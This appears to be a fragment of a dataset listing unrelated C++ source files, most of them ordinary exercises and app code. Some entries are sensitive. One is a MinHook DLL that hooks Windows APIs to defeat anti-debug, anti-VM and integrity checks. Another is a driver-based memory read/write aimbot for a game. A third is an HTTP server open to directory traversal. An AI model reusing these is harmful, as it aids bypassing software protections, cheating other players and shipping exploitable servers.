pCodecCtx, videoStream, img)) {\n        std::cerr << \"Failed to load image frame.\\n\";\n        return -1;\n    }\n\n    const int numNoiseFrames = 30;\n    std::vector<cv::Mat> noiseFrames = generateNoiseFrames(img.cols, img.rows, numNoiseFrames);\n\n    cv::namedWindow(\"Blended Image Playback\", cv::WINDOW_AUTOSIZE);\n    int noiseFrameIndex = 0;\n\n    while (true) {\n        auto loopStartTime = std::chrono::steady_clock::now();\n\n        // Use pre-generated noise fra",
    "#include <iostream>\r\n#include <string>\r\n#include <thread>\r\n#include <vector>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <netinet/in.h>\r\n#include <unistd.h>\r\n\r\n#define PORT 8080\r\n\r\nusing namespace std;\r\n\r\nvoid handle_client(int client_socket) {\r\n    char buffer[1024] = {0};\r\n    read(client_socket, buffer, 1024);\r\n\r\n    string request(buffer);\r\n    string file_path = \"www/index.html\"; // Default file\r\n\r\n    if (request.find(\"GET /\") == 0) {\r\n        size_t start = 5; // Skip \"GET /\"\r\n        size_t end = request.find(' ', start);\r\n        file_path = \"www\" + request.substr(start, end - start);\r\n        if (file_path.back() == '/') {\r\n            file_path += \"index.html\"; // Default to index.html\r\n        }\r\n    }\r\n\r\n    ifstream file(file_path);\r\n    stringstream buffer_stream;\r\n\r\n    if (file.is_open()) {\r\n        buffer_stream << file.rdbuf();\r\n        string response = \"HTTP/1.1 200 OK\\nContent-Type: text/html\\n\\n\" + buffer_stream.str();\r\n        send(client_socket, response.c_str(), response.size(), 0);\r\n    } else {\r\n        string not_found = \"HTTP/1.1 404 Not Found\\nContent-Type: text/html\\n\\n<h1>404 Not Found</h1>\";\r\n        send(client_socket, not_found.c_str(), not_found.size(), 0);\r\n    }\r\n\r\n    close(client_socket);\r\n}\r\n\r\nint main() {\r\n    int server_fd = socket(AF_INET, SOCK_STREAM, 0);\r\n    if (server_fd == 0) {\r\n        perror(\"Socket failed\");\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    struct sockaddr_in address;\r\n    int addrlen = sizeof(address);\r\n    address.sin_family = AF_INET;\r\n    address.sin_addr.s_addr = INADDR_ANY;\r\n    address.sin_port = htons(PORT);\r\n\r\n    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {\r\n        perror(\"Bind failed\");\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    if (listen(server_fd, 3) < 0) {\r\n        perror(\"Listen failed\");\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    while (true) {\r\n        int client_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);\r\n        if (client_socket < 0) {\r\n            perror(\"Accept failed\");\r\n            continue;\r\n        }\r\n        thread client_thread(handle_client, client_socket);\r\n        client_thread.detach();\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "\ufeff#include \"hooked_fun.h\"\r\n#include <MinHook.h>\r\n#include <vector>\r\n\r\n \r\nEXTERN_C  __declspec(dllexport) auto proxy() -> VOID\r\n{\r\n    return;\r\n}\r\n\r\n\r\nINT WINAPI hook_messagebox\r\n(\r\n    HWND hWnd,\r\n    LPCWSTR lpText,\r\n    LPCWSTR lpCaption,\r\n    UINT uType\r\n)\r\n{\r\n    return MessageBoxW(hWnd, L\"AyeMeh!\\n\", lpCaption, uType);\r\n}\r\nSHORT WINAPI  hook_get_asynk_key\r\n(\r\n    INT vKey\r\n)\r\n{\r\n    printf(\"key ->\\d%p\\n\", vKey);\r\n    return GetAsyncKeyState(vKey);\r\n}\r\n\r\nNO_INLINE auto init_hook\r\n(\r\n\r\n) -> BOOLEAN\r\n{\r\n    MH_STATUS mh_status;\r\n    PVOID api_addr[INT8_MAX] = { NULL };\r\n    HMODULE ntdll_base = NULL; \r\n    HMODULE kernel32_base = NULL;\r\n    HMODULE kernelbase_base = NULL; \r\n    HMODULE user32_base = NULL;\r\n    CRC_RUN_INFO crc_rin_inf = { NULL };\r\n\r\n    hooked_fun::anti_debug_util anti_deb;\r\n    hooked_fun::crc_file_util anti_crc_file;\r\n    hooked_fun::anti_analisys_util anti_anal; //he-he boy\r\n    hooked_fun::crc_runtime_util crc_runt;\r\n    hooked_fun::anti_vm_util anti_vm;\r\n    hooked_fun::util_list_hook list_hook_util;\r\n\r\n    ntdll_base = GetModuleHandleW(L\"ntdll.dll\"); \r\n    kernel32_base = GetModuleHandleW(L\"kernel32.dll\");    \r\n    kernelbase_base = GetModuleHandleW(L\"kernelbase.dll\");\r\n    user32_base = GetModuleHandleW(L\"user32.dll\");\r\n \r\n    mh_status = MH_Initialize();\r\n    if (mh_status != MH_OK && mh_status != MH_ERROR_ALREADY_INITIALIZED)\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    //anti-debug\r\n    api_addr[NULL] = GetProcAddress(ntdll_base, \"NtQueryInformationProcess\");\r\n    api_addr[1] = GetProcAddress(ntdll_base, \"NtSetInformationThread\");\r\n    api_addr[2] = GetProcAddress(ntdll_base, \"NtGetContextThread\");\r\n    api_addr[3] = GetProcAddress(user32_base, \"GetWindowTextA\");\r\n    api_addr[4] = GetProcAddress(kernelbase_base, \"CompareStringA\");\r\n     \r\n    //anti-crc_file\r\n    api_addr[5] = GetProcAddress(kernel32_base, \"CreateFileW\");\r\n    list_hook_util.add_crc_file_list(NULL);\r\n \r\n    //ana-analisys\r\n    api_addr[6] = GetProcAddress(user32_base, \"FindWindowA\");\r\n    api_addr[7] = GetProcAddress(kernel32_base, \"lstrcmpiA\");\r\n    api_addr[8] = GetProcAddress(ntdll_base, \"RtlAddVectoredExceptionHandler\");\r\n\r\n    //anti-vm\r\n    api_addr[9] = GetProcAddress(kernel32_base, \"GetSystemFirmwareTable\");\r\n    api_addr[10] = GetProcAddress(kernelbase_base, \"RegOpenKeyExA\");\r\n    api_addr[11] = GetProcAddress(kernelbase_base, \"RegQueryValueExA\"); \r\n    list_hook_util.add_exit_instr_patch(NULL);\r\n    //anti-sandbox\r\n    api_addr[12] = GetProcAddress(kernelbase_base, \"GetModuleHandleA\");\r\n\r\n    //crc runtime\r\n    api_addr[13] = GetProcAddress(kernelbase_base, \"VirtualAlloc\");\r\n    list_hook_util.add_crc_run_list(NULL);\r\n\r\n    mh_status = MH_Initialize();\r\n    if (mh_status != MH_OK && mh_status != MH_ERROR_ALREADY_INITIALIZED)\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    anti_deb.clean_peb();\r\n    AddVectoredExceptionHandler(TRUE, crc_runt.veh_hook);\r\n\r\n    if (\r\n        MH_CreateHook(api_addr[NULL], anti_deb.query_proc, &hooked_fun::anti_deb.orig_query_proc) != MH_OK ||\r\n        MH_EnableHook(api_addr[NULL]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    if (\r\n        MH_CreateHook(api_addr[1], anti_deb.set_thread, &hooked_fun::anti_deb.orig_set_thread) != MH_OK ||\r\n        MH_EnableHook(api_addr[1]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    if (\r\n        MH_CreateHook(api_addr[2], anti_deb.get_context, &hooked_fun::anti_deb.orig_get_context) != MH_OK ||\r\n        MH_EnableHook(api_addr[2]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    if (\r\n        MH_CreateHook(api_addr[3], anti_deb.get_windows_texta, &hooked_fun::anti_deb.orig_windows_texta) != MH_OK ||\r\n        MH_EnableHook(api_addr[3]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n \r\n    if (\r\n        MH_CreateHook(api_addr[4], anti_deb.compare_stringa, &hooked_fun::anti_deb.orig_compare_stringa) != MH_OK ||\r\n        MH_EnableHook(api_addr[4]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    } \r\n\r\n    if  (\r\n            MH_CreateHook(api_addr[5], anti_crc_file.create_filew, &hooked_fun::crc_file.orig_create_filew) != MH_OK ||\r\n            MH_EnableHook(api_addr[5]) != MH_OK  \r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n   \r\n\r\n    if (\r\n        MH_CreateHook(api_addr[6], anti_anal.find_windowa, &hooked_fun::anti_monit.orig_find_windowa) != MH_OK ||\r\n        MH_EnableHook(api_addr[6]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    if (\r\n        MH_CreateHook(api_addr[7], anti_anal.strcmpa, &hooked_fun::anti_monit.orig_strcmpa) != MH_OK ||\r\n        MH_EnableHook(api_addr[7]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n\r\n    \r\n   // Use for get imp loader\r\n    if (\r\n        MH_CreateHook(api_addr[8], anti_anal.add_vector_exc_handler, &hooked_fun::orig_add_vec_handler) != MH_OK ||\r\n        MH_EnableHook(api_addr[8]) != MH_OK\r\n        )\r\n    {\r\n        return FALSE;\r\n    }\r\n    \r\n\r\n    if (\r\n        MH_CreateHook(api_addr[9], anti_vm.get_system_",
    "\ufeff#include <iostream>\r\n\r\n#include <Windows.h>\r\n#include <Tlhelp32.h>\r\n#include <cmath>\r\n\r\n#include \"client.dll.hpp\"\r\n#include \"offsets.hpp\"\r\n\r\nstatic DWORD get_process_id(const wchar_t* process_name) {\r\n\tDWORD process_id = 0;\r\n\r\n\tHANDLE snap_shot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\r\n\tif (snap_shot == INVALID_HANDLE_VALUE)\r\n\t\treturn process_id;\r\n\r\n\tPROCESSENTRY32W entry = {};\r\n\tentry.dwSize = sizeof(decltype(entry));\r\n\r\n\tif (Process32FirstW(snap_shot, &entry) == TRUE) {\r\n\t\t// Check if the first handle is the one we want\r\n\t\tif (_wcsicmp(process_name, entry.szExeFile) == 0)\r\n\t\t\tprocess_id = entry.th32ProcessID;\r\n\t\telse {\r\n\t\t\twhile (Process32NextW(snap_shot, &entry) == TRUE) {\r\n\t\t\t\tif (_wcsicmp(process_name, entry.szExeFile) == 0) {\r\n\t\t\t\t\tprocess_id = entry.th32ProcessID;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tCloseHandle(snap_shot);\r\n\r\n\treturn process_id;\r\n\r\n}\r\n\r\nstatic std::uintptr_t get_module_base(const DWORD pid, const wchar_t* module_name) {\r\n\tstd::uintptr_t module_base = 0;\r\n\r\n\t// Snap-shot of process modules (dlls)\r\n\tHANDLE snap_shot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);\r\n\tif (snap_shot == INVALID_HANDLE_VALUE)\r\n\t\treturn module_base;\r\n\r\n\tMODULEENTRY32W entry = {};\r\n\tentry.dwSize = sizeof(decltype(entry));\r\n\r\n\tif (Module32FirstW(snap_shot, &entry) == TRUE) {\r\n\t\tif (wcsstr(module_name, entry.szModule) != nullptr)\r\n\t\t\tmodule_base = reinterpret_cast<std::uintptr_t>(entry.modBaseAddr);\r\n\t\telse {\r\n\t\t\twhile (Module32NextW(snap_shot, &entry) == TRUE) {\r\n\t\t\t\tif (wcsstr(module_name, entry.szModule) != nullptr) {\r\n\t\t\t\t\tmodule_base = reinterpret_cast<std::uintptr_t>(entry.modBaseAddr);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tCloseHandle(snap_shot);\r\n\r\n\treturn module_base;\r\n}\r\n\r\nstruct Vector3 {\r\n\tfloat x, y, z;\r\n};\r\n\r\nfloat calculate_distance(const Vector3& point1, const Vector3& point2) {\r\n\tconst float dx = point1.x - point2.x;\r\n\tconst float dy = point1.y - point2.y;\r\n\tconst float dz = point1.z - point2.z;\r\n\treturn std::sqrt(dx * dx + dy * dy + dz * dz);\r\n}\r\n\r\n// Func\u021bie pentru a calcula unghiul necesar pentru a \u00eendrepta arma c\u0103tre capul inamicului\r\nVector3 calculate_aim_angle(const Vector3& view_angles, const Vector3& enemy_head_position) {\r\n\tVector3 aim_angle;\r\n\r\n\t// Implementeaz\u0103 logica de calcul a unghiului aici\r\n\t// Po\u021bi folosi coordonatele juc\u0103torului \u0219i ale inamicului pentru a determina unghiul dorit.\r\n\r\n\t// Exemplu simplu: Acesta va \u00eendrepta arma c\u0103tre pozi\u021bia capului inamicului\r\n\taim_angle.x = enemy_head_position.x - view_angles.x;\r\n\taim_angle.y = enemy_head_position.y - view_angles.y;\r\n\taim_angle.z = enemy_head_position.z - view_angles.z;\r\n\r\n\treturn aim_angle;\r\n}\r\n\r\nnamespace driver {\r\n\tnamespace codes {\r\n\t\t// used for driver setup\r\n\t\tconstexpr ULONG attach = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);\r\n\r\n\t\t// read process memory\r\n\t\tconstexpr ULONG read = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);\r\n\r\n\t\t// write process memory\r\n\t\tconstexpr ULONG write = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);\r\n\t} // namespace codes\r\n\r\n\t// Shared between user mode & kernel mode\r\n\tstruct Request {\r\n\t\tHANDLE\tprocess_id;\r\n\r\n\t\tPVOID target;\r\n\t\tPVOID buffer;\r\n\r\n\t\tSIZE_T size;\r\n\t\tSIZE_T return_size;\r\n\t};\r\n\r\n\tbool attach_to_process(HANDLE driver_handle, const DWORD pid) {\r\n\t\tRequest r;\r\n\t\tr.process_id = reinterpret_cast<HANDLE>(pid);\r\n\t\t\r\n\t\treturn DeviceIoControl(driver_handle, codes::attach, &r, sizeof(r), &r, sizeof(r), nullptr, nullptr); \r\n\t}\r\n\r\n\ttemplate <class T>\r\n\tT read_memory(HANDLE driver_handle, const std::uintptr_t addr) {\r\n\t\tT temp = {};\r\n\r\n\t\tRequest r; \r\n\t\tr.target = reinterpret_cast<PVOID>(addr);\r\n\t\tr.buffer = &temp; \r\n\t\tr.size = sizeof(T);\r\n\r\n\t\tDeviceIoControl(driver_handle, codes::read, &r, sizeof(r), &r, sizeof(r), nullptr, nullptr);\r\n\r\n\t\treturn temp;\r\n\t}\r\n\r\n\ttemplate <class T>\r\n\tvoid write_memory(HANDLE driver_handle, const std::uintptr_t addr, const T& value) {\r\n\t\tRequest r;\r\n\t\tr.target = reinterpret_cast<PVOID>(addr);\r\n\t\tr.buffer = (PVOID)&value;\r\n\t\tr.size = sizeof(T);\r\n\r\n\t\tDeviceIoControl(driver_handle, codes::write, &r, sizeof(r), &r, sizeof(r), nullptr, nullptr);\r\n\t}\r\n\r\n\tvoid activate_aim_bot(HANDLE driver_handle, const std::uintptr_t client_base) {\r\n\t\t// Ob\u021bine adresa juc\u0103torului local (tu)\r\n\t\tconst auto local_player_pawn = read_memory<std::uintptr_t>(driver_handle, client_base + client_dll::dwLocalPlayerPawn);\r\n\r\n\t\tif (local_player_pawn == 0)\r\n\t\t\treturn; // Nu putem continua f\u0103r\u0103 o adres\u0103 valid\u0103 pentru juc\u0103torul local\r\n\r\n\t\t// Ob\u021bine coordonatele tale (juc\u0103torul local)\r\n\t\tconst auto local_position = read_memory<Vector3>(driver_handle, local_player_pawn + client_dll::dwPlantedC4);\r\n\r\n\t\t// Ob\u021bine adresa entit\u0103\u021bii inamice cea mai apropiat\u0103\r\n\t\tstd::uintptr_t closest_enemy = 0;\r\n\t\tfloat closest_distance = std::numeric_limits<float>::max();\r\n\r\n\t\tfor (int i = 1; i <= 64; ++i) {\r\n\t\t\tconst auto enemy_pawn = read_memory<std::uintptr_t>(driver_handle, client_base + c",
    "// Author: Aleksander Rodriguez\r\n// Course: COSC 2436\r\n// Program Set 3\r\n// References: none\r\n\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nvoid printSquares(int , int, int);\r\n\r\nint main()\r\n{\r\n\r\n\tchar yes = 'n';\r\n\tdo\r\n\t{\r\n\t\tint size;\r\n\t\tint rows = 1;\r\n\t\tint cols = 1;\r\n\r\n\t\tcout << \"Enter size [5-20]: \";\r\n\t\tcin >> size;\r\n\t\twhile (size < 5 || size > 20)\r\n\t\t{\r\n\t\t\tcout << endl << \"Reenter size [5-20]: \";\r\n\t\t\tcin >> size;\r\n\t\t}\r\n\r\n\t\tprintSquares(size, rows, cols);\r\n\r\n\t\t//Check case\r\n\t\tcout << endl << \"Run Again (Y/N): \";\r\n\t\tcin >> yes;\r\n\t\tcout << endl;\r\n\r\n\t} while (yes == 'Y' || yes == 'y');\r\n}\r\n\r\n\r\nvoid printSquares(int siz, int x, int y)\r\n{\r\n\t// this if checks where X's need\r\n\t// to be for rows\r\n\tif (x == 1 || x == siz|| y == 1 || y == siz        \r\n\t\t||( x == 3 && y > siz -siz +2 && y < siz -1)   \r\n\t\t|| x == siz -2 && y > siz - siz + 2 && y < siz - 1\r\n\t\t|| x == siz - 4 && y > siz - siz + 4 && y < siz - 3\r\n\t\t||(x == siz - siz + 5 && y > siz - siz + 4 && y < siz - 3)\r\n\t\t||(x == siz - siz + 7 && y > siz - siz + 6 && y < siz - 5)\r\n\t\t|| x == siz - 6 && y > siz - siz + 6 && y < siz - 5\r\n\t\t|| (x == siz - siz + 9 && y > siz - siz + 8 && y < siz - 7)\r\n\t\t|| x == siz - 8 && y > siz - siz + 8 && y < siz - 7)\r\n\t{\r\n\t\tcout << \"X\";\r\n\t}\r\n\t// if check for X's on columns\r\n\telse if ((y == 3 && x > siz - siz + 2 && x < siz - 1)\r\n\t\t\t|| y == siz - 2 && x > siz - siz + 2 && x < siz - 1\r\n\t\t\t|| y == siz - 4 && x > siz - siz + 4 && x < siz - 3\r\n\t\t\t|| (y == siz - siz + 5 && x > siz - siz + 4 && x < siz - 3)\r\n\t\t\t|| (y == siz - siz + 7 && x > siz - siz + 6 && x < siz - 5)\r\n\t\t\t|| y == siz - 6 && x > siz - siz + 6 && x < siz - 5\r\n\t\t\t|| (y == siz - siz + 9 && x > siz - siz + 8 && x < siz - 7)\r\n\t\t\t|| y == siz - 8 && x > siz - siz + 8 && x < siz - 7)\r\n\t{\r\n\t\tcout << \"X\";\r\n\t}\r\n\telse {\r\n\t\tcout << \" \";\r\n\t}\r\n\t\r\n\t\r\n\ty++; // iterate my make shift loop\r\n\t\r\n\t// this will allow me to run recursion as a 2D for loop \r\n\tif (y == siz + 1)\r\n\t{\r\n\t\tx++;\r\n\t\ty = 1;\r\n\t\tcout << endl;\r\n\t}\r\n\r\n\t// recursion will stop when x = siz +1\r\n\tif (x != siz +1)\r\n\t{\r\n\r\n\t\treturn printSquares(siz, x, y);\r\n\t}\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"recipe\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <Eigen/Dense>\n#include <cstdlib>\n#include <cmath>\n#include <ctime>\n\nconst int INPUT_NODES = 10;\nconst int HIDDEN_NODES = 10;\nconst int OUTPUT_NODES = 10;\nconst int NUM_SAMPLES = 100;\nconst double LEARNING_RATE = 0.00001;\n\nusing namespace std;\nusing namespace Eigen;\n\ndouble sigmoid(double x) {\n    return 1.0 / (1.0 + exp(-x));\n}\n\ndouble sigmoidDerivative(double x) {\n    return x * (1.0 - x);\n}\n\nMatrixXd initializeWeights(int rows, int cols) {\n    MatrixXd weights = MatrixXd::Random(rows, cols);\n    weights = (weights + MatrixXd::Constant(rows, cols, 1.0)) / 2.0; // Normalize between 0 and 1\n    return weights;\n}\n\nclass NeuralNetwork {\n private:\n    MatrixXd inputWeights;\n    MatrixXd hiddenWeights;\n\n public:\n    NeuralNetwork() {\n        srand(time(0));\n        inputWeights = initializeWeights(INPUT_NODES, HIDDEN_NODES);\n        hiddenWeights = initializeWeights(HIDDEN_NODES, OUTPUT_NODES);\n    }\n\n    void train(const MatrixXd& inputs, const MatrixXd& targets, int epochs) {\n        for (int epoch = 0; epoch < epochs; ++epoch) {\n            for (int i = 0; i < inputs.rows(); ++i) {\n                VectorXd hiddenOutputs = (inputs.row(i) * inputWeights).unaryExpr(ptr_fun(sigmoid));\n                VectorXd finalOutputs = (hiddenOutputs.transpose() * hiddenWeights).unaryExpr(ptr_fun(sigmoid));\n\n                VectorXd outputErrors = targets.row(i).transpose() - finalOutputs;\n                VectorXd hiddenErrors = (hiddenWeights * outputErrors).cwiseProduct(hiddenOutputs.unaryExpr(ptr_fun(sigmoidDerivative)));\n\n                hiddenWeights += LEARNING_RATE * hiddenOutputs * outputErrors.transpose();\n                inputWeights += LEARNING_RATE * inputs.row(i).transpose() * hiddenErrors.transpose();\n            }\n        } \n    }\n\n    void predict(const VectorXd& input) {\n        VectorXd hiddenOutputs = (input.transpose() * inputWeights).unaryExpr(ptr_fun(sigmoid));\n        VectorXd finalOutputs = (hiddenOutputs.transpose() * hiddenWeights).unaryExpr(ptr_fun(sigmoid));\n\n        cout << \"Predicci\u00f3n: \";\n        for (int i = 0; i < finalOutputs.size(); ++i) {\n            cout << finalOutputs[i] << \" \";\n        }\n        cout << \"\\n\";\n    }\n};\n\nint main() {\n    NeuralNetwork nn;\n\n    // Generar datos de entrenamiento aleatorios \n    MatrixXd inputs = MatrixXd::Random(NUM_SAMPLES, INPUT_NODES);\n    inputs = (inputs + MatrixXd::Constant(NUM_SAMPLES, INPUT_NODES, 1.0)) / 2.0; // Normalize between 0 and 1\n\n    MatrixXd targets = MatrixXd::Random(NUM_SAMPLES, OUTPUT_NODES);\n    targets = (targets + MatrixXd::Constant(NUM_SAMPLES, OUTPUT_NODES, 1.0)) / 2.0; // Normalize between 0 and 1\n\n    nn.train(inputs, targets, 1000);\n\n    // Realizar predicci\u00f3n con un nuevo conjunto de datos\n    VectorXd nuevoInput = (VectorXd::Random(INPUT_NODES) + VectorXd::Constant(INPUT_NODES, 1.0)) / 2.0;\n\n    nn.predict(nuevoInput);\n\n    return 0;\n}\n\n\n\n",
    "\n#include<iostream>\nusing namespace std;\n\nint partition(int* arr,int start,int end){\n\t//this func places start index in correct postion and returns original value\n\t//first find original position of start index\n\t\n\t//find all elements which are less than partition element\n\tint number_less_than_index=0;\n\tfor(int i=start+1;i<end+1;i++){\n\t\tif(arr[i] < arr[start]){\n\t\t\tnumber_less_than_index++;\n\t\t}\n\t}\n\t\n\t//now actual index will be:\n\tint correct_index = start + number_less_than_index;\n\t\n\t//simply swap the start element and the correct index element\n\t\n\tswap(arr[start],arr[correct_index]);\t\n\t\n\t//now after we have placed this element int its correct position, we need to make sure that this is actually at its actual position\n\t\n\t//make sure that this element is at it's correct position\n\t\n\tint i,j;\n\t\n\ti=start;\n\tj=end;\n\twhile(i<correct_index && j>correct_index){\n\t\twhile(arr[i] < arr[correct_index]){\n\t\t\t//this loop will keep on traversing , until we find an element to right of correct index which is greater than correct index\n\t\t\ti++;\n\t\t}\n\t\t\n\t\twhile(arr[j] > arr[correct_index]){\n\t\t\t//this loop will keep on traversing , until we find an element to right of correct index which is less than correct index\n\t\t\tj--;\n\t\t}\n\t\t\n\t\tif(i<correct_index && j>correct_index){\n\t\t\tswap(arr[i],arr[j]);\n\t\t\t\n\t\t\ti++;\n\t\t\tj--;\n\t\t}\n\t}\n\t\n\treturn correct_index;\n}\n\nvoid quickSort(int* arr, int start, int end){\n\t//first find partition, partition is element which is at its correct place  ----> its position doesn't change even after sorting\n\t\n//\tint partition;\n//\tarr[start] = partition;   //assuming start element is partition element\n\t\n\tif(start >= end){\n\t\treturn;\n\t}\n\t\n\tint partition_index;\n\tpartition_index = partition(arr,start,end);\n\t//this function will return the actual position of start element\n\t\n\t//since after running function the start element is placed in \"correct\" position and we know that position throught partition_index, we dont need to change position of it any more\n\tquickSort(arr,start,partition_index-1);\n\tquickSort(arr,partition_index+1,end);\n}\n\nint main(){\n\tint arr[7] = {5,1,3,10,7,14,2};\n\tint size;\n\tsize = 7;\n\t\n\tquickSort(arr,0,size-1);\n\t\n\tint k;\n\tfor(k=0;k<size;k++){\n\t\tcout<<arr[k]<<\" \";\n\t}\n\treturn 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//\n// Created by leo on 05.08.24.\n//\n\n#include \"commitmessage.h\"\n#include \"common.h\"\n#include <regex>\n\n\n\nCommitMessage::CommitMessage(): type(), breaking(false) {\n}\n\nCommitMessage::CommitMessage(const std::vector<std::string> &parts) {\n    if (parts.size() >= 5) {\n        type = parts[0];\n        scope = removeNewlines(parts[1]);\n        title = removeNewlines(parts[2]);\n        description = removeNewlines(parts[3]);\n        footer = removeNewlines(parts[4]);\n        breaking = footer.find(\"BREAKING CHANGE\") != std::string::npos;\n    }\n}\n\nstd::string CommitMessage::getTitle() const {\n    return title;\n}\n\nstd::string CommitMessage::getDescription() const {\n    return description;\n}\n\nstd::string CommitMessage::getCommitType() const {\n    return type;\n}\n\nbool CommitMessage::getIsBreaking() const {\n    return breaking;\n}\n\nstd::vector<std::string> CommitMessage::parseCommitMessage(std::string& message) {\n    std::vector<std::string> result(5);\n    const std::regex regexPattern(R\"((\\w+)(?:\\(([\\w\\-]+)\\))?:\\s*(.+?)(?:\\n\\n(.*?))?(?:\\n\\n(.*))?$)\");\n    const auto trimmedMessage = removeNewlines(message);\n    if (std::smatch matches; std::regex_match(trimmedMessage, matches, regexPattern)) {\n        result[0] = matches[1].str(); // Type\n        result[1] = matches[2].str(); // Scope\n        result[2] = matches[3].str(); // Title\n        result[3] = matches[4].str(); // Description\n        result[4] = matches[5].str(); // Footer\n    }\n    return result;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <fstream>\r\n#include <algorithm> // Required for remove_if\r\n\r\nusing namespace std;\r\nclass Task {\r\nprivate:\r\n// We ideally want our class to have an ID, A title, a description, a status.\r\n    int ID;\r\n    string title;\r\n    string description;\r\n    string status;\r\n\r\npublic:\r\n// We need constructors, setters and getters\r\n    Task(int id, string _title, string _description, string _status) : ID(id), title(_title), description(_description), status(_status) {}\r\n\r\n    int getID() const {\r\n        return ID;\r\n    }\r\n    string getTitle() const {\r\n        return title;\r\n    }\r\n    string getDescription() const {\r\n        return description;\r\n    }\r\n    string getStatus() const {\r\n        return status;\r\n    }\r\n\r\n    // setters are never constant but getters are \r\n    void setTitle(string _title)  {\r\n        title = _title;\r\n    }\r\n\r\n    void setDescription(string _description)  {\r\n        description = _description;\r\n    }\r\n\r\n    void setStatus (string _status)  {\r\n        status = _status;\r\n    }\r\n    // This just allows us to display the contents\r\n    void display() const {\r\n        cout << \"The ID is \" << ID << \"\\nThe title is \" << title << \"\\nThe description is \" << description << \"\\nThe status is \" << status << endl;\r\n    }\r\n};\r\n\r\n// What features would we want our task manager to 